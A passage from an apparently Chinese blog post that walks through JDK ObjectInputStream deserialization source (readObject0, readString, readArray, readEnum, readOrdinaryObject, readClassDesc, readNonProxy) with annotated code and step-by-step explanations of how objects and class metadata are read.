class="keyword">byte</span> tc;</span><br><span class="line">        <span class="keyword">while</span> ((tc = bin.peekByte()) == TC_RESET) &#123;</span><br><span class="line">            bin.readByte();</span><br><span class="line">            handleReset();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        depth++; <span class="comment">//递归调用标记 </span></span><br><span class="line">        totalObjectRefs++;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 根据不同的TC标记读取内容</span></span><br><span class="line">            <span class="keyword">switch</span> (tc) &#123;</span><br><span class="line">                <span class="comment">/*** 1、非对象非有效数据 对应调用即可 **/</span></span><br><span class="line">                <span class="keyword">case</span> TC_NULL:</span><br><span class="line">                    <span class="keyword">return</span> readNull();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">                    <span class="keyword">return</span> readHandle(unshared);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TC_CLASS:</span><br><span class="line">                    <span class="keyword">return</span> readClass(unshared); </span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">                <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">                    <span class="keyword">return</span> readClassDesc(unshared);</span><br><span class="line"></span><br><span class="line">                <span class="comment">/*** 2、具体对象的反序列化调用checkResolve **/</span></span><br><span class="line">                <span class="keyword">case</span> TC_STRING:</span><br><span class="line">                <span class="keyword">case</span> TC_LONGSTRING:</span><br><span class="line">                    <span class="keyword">return</span> checkResolve(readString(unshared)); <span class="comment">// 调用readString</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TC_ARRAY:</span><br><span class="line">                    <span class="keyword">return</span> checkResolve(readArray(unshared)); <span class="comment">// 调用readArray</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TC_ENUM:</span><br><span class="line">                    <span class="keyword">return</span> checkResolve(readEnum(unshared)); <span class="comment">// 调用readEnum </span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TC_OBJECT:</span><br><span class="line">                    <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared)); <span class="comment">//调用readOrdinaryObject</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TC_EXCEPTION:</span><br><span class="line">                    IOException ex = readFatalException();</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> WriteAbortedException(<span class="string">"writing aborted"</span>, ex);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TC_BLOCKDATA:</span><br><span class="line">                <span class="keyword">case</span> TC_BLOCKDATALONG:</span><br><span class="line">                    <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                        bin.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">                        bin.peek();             <span class="comment">// force header read</span></span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> OptionalDataException(</span><br><span class="line">                            bin.currentBlockRemaining());</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(</span><br><span class="line">                            <span class="string">"unexpected block data"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TC_ENDBLOCKDATA:</span><br><span class="line">                    <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> OptionalDataException(<span class="keyword">true</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(</span><br><span class="line">                            <span class="string">"unexpected end of block data"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(</span><br><span class="line">                        String.format(<span class="string">"invalid type code: %02X"</span>, tc));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            depth--;</span><br><span class="line">            bin.setBlockDataMode(oldMode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="read-String-Array-Enum"><a href="#read-String-Array-Enum" class="headerlink" title="read[String|Array|Enum]"></a>read[String|Array|Enum]</h5><p>读取实例值并返回对应对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//String的读取，并返回字符串对象</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">readString</span><span class="params">(<span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String str;</span><br><span class="line">    <span class="keyword">byte</span> tc = bin.readByte(); <span class="comment">//tc获取标识</span></span><br><span class="line">    <span class="keyword">switch</span> (tc) &#123;</span><br><span class="line">        <span class="keyword">case</span> TC_STRING:</span><br><span class="line">            str = bin.readUTF(); <span class="comment">// TC_STRING标识，调用readUTF，先读取字符串长度，在读取字符串</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> TC_LONGSTRING:</span><br><span class="line">            str = bin.readLongUTF(); <span class="comment">// TC_LONGSTRING标识，调用readLongUTF，先读取字符串长度，在读取字符串</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(</span><br><span class="line">                String.format(<span class="string">"invalid type code: %02X"</span>, tc));</span><br><span class="line">    &#125;</span><br><span class="line">    passHandle = handles.assign(unshared ? unsharedMarker : str);</span><br><span class="line">    handles.finish(passHandle);</span><br><span class="line">    <span class="comment">//返回字符串对象</span></span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Array的读取，并返回array对象</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readArray</span><span class="params">(<span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 通过标识判断是否ARRAY类型</span></span><br><span class="line">    <span class="keyword">if</span> (bin.readByte() != TC_ARRAY) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// readClassDesc</span></span><br><span class="line">    ObjectStreamClass desc = readClassDesc(<span class="keyword">false</span>);</span><br><span class="line">    <span class="comment">// 获取数组长度</span></span><br><span class="line">    <span class="keyword">int</span> len = bin.readInt();</span><br><span class="line"></span><br><span class="line">    filterCheck(desc.forClass(), len);</span><br><span class="line"></span><br><span class="line">    Object array = <span class="keyword">null</span>;</span><br><span class="line">    Class&lt;?&gt; cl, ccl = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> ((cl = desc.forClass()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ccl = cl.getComponentType();</span><br><span class="line">        <span class="comment">// 创建Array实例</span></span><br><span class="line">        array = Array.newInstance(ccl, len);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> arrayHandle = handles.assign(unshared ? unsharedMarker : array);</span><br><span class="line">    ClassNotFoundException resolveEx = desc.getResolveException();</span><br><span class="line">    <span class="keyword">if</span> (resolveEx != <span class="keyword">null</span>) &#123;</span><br><span class="line">        handles.markException(arrayHandle, resolveEx);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ccl == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            readObject0(<span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ccl.isPrimitive()) &#123; <span class="comment">//原生类型数组直接读取</span></span><br><span class="line">        <span class="keyword">if</span> (ccl == Integer.TYPE) &#123;</span><br><span class="line">            bin.readInts((<span class="keyword">int</span>[]) array, <span class="number">0</span>, len);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ccl == Byte.TYPE) &#123;</span><br><span class="line">            bin.readFully((<span class="keyword">byte</span>[]) array, <span class="number">0</span>, len, <span class="keyword">true</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ccl == Long.TYPE) &#123;</span><br><span class="line">            bin.readLongs((<span class="keyword">long</span>[]) array, <span class="number">0</span>, len);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ccl == Float.TYPE) &#123;</span><br><span class="line">            bin.readFloats((<span class="keyword">float</span>[]) array, <span class="number">0</span>, len);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ccl == Double.TYPE) &#123;</span><br><span class="line">            bin.readDoubles((<span class="keyword">double</span>[]) array, <span class="number">0</span>, len);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ccl == Short.TYPE) &#123;</span><br><span class="line">            bin.readShorts((<span class="keyword">short</span>[]) array, <span class="number">0</span>, len);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ccl == Character.TYPE) &#123;</span><br><span class="line">            bin.readChars((<span class="keyword">char</span>[]) array, <span class="number">0</span>, len);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ccl == Boolean.TYPE) &#123;</span><br><span class="line">            bin.readBooleans((<span class="keyword">boolean</span>[]) array, <span class="number">0</span>, len);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//非原生类型数组调用readObject0读取</span></span><br><span class="line">        Object[] oa = (Object[]) array;</span><br><span class="line">        <span class="comment">// 循环数组长度</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            oa[i] = readObject0(<span class="keyword">false</span>);</span><br><span class="line">            handles.markDependency(arrayHandle, passHandle);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    handles.finish(arrayHandle);</span><br><span class="line">    passHandle = arrayHandle;</span><br><span class="line">    <span class="comment">// 返回数组对象</span></span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Enum的读取</span></span><br><span class="line"><span class="keyword">private</span> Enum&lt;?&gt; readEnum(<span class="keyword">boolean</span> unshared) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (bin.readByte() != TC_ENUM) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ObjectStreamClass desc = readClassDesc(<span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!desc.isEnum()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(<span class="string">"non-enum class: "</span> + desc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> enumHandle = handles.assign(unshared ? unsharedMarker : <span class="keyword">null</span>);</span><br><span class="line">    ClassNotFoundException resolveEx = desc.getResolveException();</span><br><span class="line">    <span class="keyword">if</span> (resolveEx != <span class="keyword">null</span>) &#123;</span><br><span class="line">        handles.markException(enumHandle, resolveEx);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String name = readString(<span class="keyword">false</span>);</span><br><span class="line">    Enum&lt;?&gt; result = <span class="keyword">null</span>;</span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">            <span class="comment">// 赋值给枚举变量具体的数值，数值来自读取的数据</span></span><br><span class="line">            Enum&lt;?&gt; en = Enum.valueOf((Class)cl, name);</span><br><span class="line">            result = en;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> InvalidObjectException(</span><br><span class="line">                <span class="string">"enum constant "</span> + name + <span class="string">" does not exist in "</span> +</span><br><span class="line">                cl).initCause(ex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!unshared) &#123;</span><br><span class="line">            handles.setObject(enumHandle, result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    handles.finish(enumHandle);</span><br><span class="line">    passHandle = enumHandle;</span><br><span class="line">    <span class="comment">//返回枚举数据</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="readOrdinaryObject："><a href="#readOrdinaryObject：" class="headerlink" title="readOrdinaryObject："></a>readOrdinaryObject：</h5><p>readOrdinaryObject主要4个步骤：</p><ol><li>根据TC_OBJECT判断是否是对象；</li><li>调用readClassDesc读取类元信息，用来创建实例;</li><li>调用Externalize/Serializable获取对象属性域信息并赋值给对象的属性;</li><li>如果是实现了readResolve，调用readResolve来直接替换前面第2-3步反序列化的对象。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readOrdinaryObject</span><span class="params">(<span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*** 1、首先根据TC_OBJECT判断是否是对象 **/</span></span><br><span class="line">    <span class="keyword">if</span> (bin.readByte() != TC_OBJECT) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*** 2、调用readClassDesc读取类元信息，并创建实例 **/</span></span><br><span class="line">    ObjectStreamClass desc = readClassDesc(<span class="keyword">false</span>);</span><br><span class="line">    desc.checkDeserialize();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据desc获取类名</span></span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    <span class="keyword">if</span> (cl == String<span class="class">.<span class="keyword">class</span> || <span class="title">cl</span> </span>== Class<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class">            || <span class="title">cl</span> </span>== ObjectStreamClass<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(<span class="string">"invalid class descriptor"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object obj;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 类是否是能可实例化，可以的话调用newInstance无参构造创建实例</span></span><br><span class="line">        obj = desc.isInstantiable() ? desc.newInstance() : <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">            desc.forClass().getName(),</span><br><span class="line">            <span class="string">"unable to create instance"</span>).initCause(ex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    passHandle = handles.assign(unshared ? unsharedMarker : obj);</span><br><span class="line">    ClassNotFoundException resolveEx = desc.getResolveException();</span><br><span class="line">    <span class="keyword">if</span> (resolveEx != <span class="keyword">null</span>) &#123;</span><br><span class="line">        handles.markException(passHandle, resolveEx);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*** 3、调用Externalize或者Serializable获取对象属性域信息并赋值 **/</span></span><br><span class="line">    <span class="keyword">if</span> (desc.isExternalizable()) &#123; <span class="comment">//实现了Externalizable，调用readExternalData</span></span><br><span class="line">        readExternalData((Externalizable) obj, desc);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//实现了Serializable，调用readSerialData</span></span><br><span class="line">        readSerialData(obj, desc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    handles.finish(passHandle);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*** 4、 判断是否实现了readResolve **/</span></span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">        handles.lookupException(passHandle) == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">        desc.hasReadResolveMethod())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 实现了readResolve，调用readResolve来替换反序列化的对象</span></span><br><span class="line">        Object rep = desc.invokeReadResolve(obj);</span><br><span class="line">        <span class="keyword">if</span> (unshared &amp;&amp; rep.getClass().isArray()) &#123;</span><br><span class="line">            rep = cloneArray(rep);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (rep != obj) &#123;</span><br><span class="line">            <span class="comment">// Filter the replacement object</span></span><br><span class="line">            <span class="keyword">if</span> (rep != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (rep.getClass().isArray()) &#123;</span><br><span class="line">                    filterCheck(rep.getClass(), Array.getLength(rep));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    filterCheck(rep.getClass(), -<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            handles.setObject(passHandle, obj = rep);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 返回对象</span></span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ObjectStreamClass-readClassDesc和readNonProxy：读取类元信息"><a href="#ObjectStreamClass-readClassDesc和readNonProxy：读取类元信息" class="headerlink" title="ObjectStreamClass#readClassDesc和readNonProxy：读取类元信息"></a>ObjectStreamClass#readClassDesc和readNonProxy：读取类元信息</h5><p>步骤：</p><ol><li>获取类的类名；</li><li>获取类的serialVersionUID；</li><li>获取类使用的序列化方式；</li><li>获取类所有序列化的属性</li></ol><p>这些信息将会被封装在ObjectStreamClass返回。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ObjectStreamClass <span class="title">readClassDesc</span><span class="params">(<span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 读取TC标识</span></span><br><span class="line">    <span class="keyword">byte</span> tc = bin.peekByte();</span><br><span class="line">    ObjectStreamClass descriptor;</span><br><span class="line">    <span class="keyword">switch</span> (tc) &#123;</span><br><span class="line">        <span class="keyword">case</span> TC_NULL:</span><br><span class="line">            descriptor = (ObjectStreamClass) readNull();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">            descriptor = (ObjectStreamClass) readHandle(unshared);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">            descriptor = readProxyDesc(unshared);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">            <span class="comment">// 如果TC是一个类描述符 意味着后面的数据是描述类信息，则调用readNonProxyDesc，readNonProxyDesc会调用readClassDescriptor，readClassDescriptor调用</span></span><br><span class="line">            descriptor = readNonProxyDesc(unshared);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(</span><br><span class="line">                String.format(<span class="string">"invalid type code: %02X"</span>, tc));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (descriptor != <span class="keyword">null</span>) &#123;</span><br><span class="line">        validateDescriptor(descriptor);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> descriptor;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readNonProxy</span><span class="params">(ObjectInputStream in)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*** 1、获取类的类名**/</span></span><br><span class="line">    name = in.readUTF(); <span class="comment">// readUTF返回字符串，这里返回目标类名</span></span><br><span class="line">    <span class="comment">/*** 2、获取类的serialVersionUID**/</span></span><br><span class="line">    suid = Long.valueOf(in.readLong()); <span class="comment">// 接下来读取serialVersionUID</span></span><br><span class="line">    isProxy = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*** 3、获取类使用的序列化方式 **/</span></span><br><span class="line">    <span class="keyword">byte</span> flags = in.readByte(); <span class="comment">//读取类使用的序列化方式</span></span><br><span class="line">    hasWriteObjectData =</span><br><span class="line">        ((flags &amp; ObjectStreamConstants.SC_WRITE_METHOD) != <span class="number">0</span>);</span><br><span class="line">    hasBlockExternalData =</span><br><span class="line">        ((flags &amp; ObjectStreamConstants.SC_BLOCK_DATA) != <span class="number">0</span>);</span><br><span class="line">    externalizable =</span><br><span class="line">        ((flags &amp; ObjectStreamConstants.SC_EXTERNALIZABLE) != <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">boolean</span> sflag =</span><br><span class="line">        ((flags &amp; ObjectStreamConstants.SC_SERIALIZABLE) != <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (externalizable &amp;&amp; sflag) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">            name, <span class="string">"serializable and externalizable flags conflict"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    serializable = externalizable || sflag;</span><br><span class="line">    isEnum = ((flags &amp; ObjectStreamConstants.SC_ENUM) != <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (isEnum &amp;&amp; suid.longValue() != <span class="number">0L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(name,</span><br><span class="line">            <span class="string">"enum descriptor has non-zero serialVersionUID: "</span> + suid);</span><br><span class="line">    &#125; </span><br><span class="line"><span class="comment">/*** 4、获取类序列化的属性 **/</span></span><br><span class="line">    <span class="keyword">int</span> numFields = in.readShort(); <span class="comment">//获取序列化的类属性个数</span></span><br><span class="line">    <span class="keyword">if</span> (isEnum &amp;&amp; numFields != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(name,</span><br><span class="line">            <span class="string">"enum descriptor has non-zero field count: "</span> + numFields);</span><br><span class="line">    &#125;</span><br><span class="line">    fields = 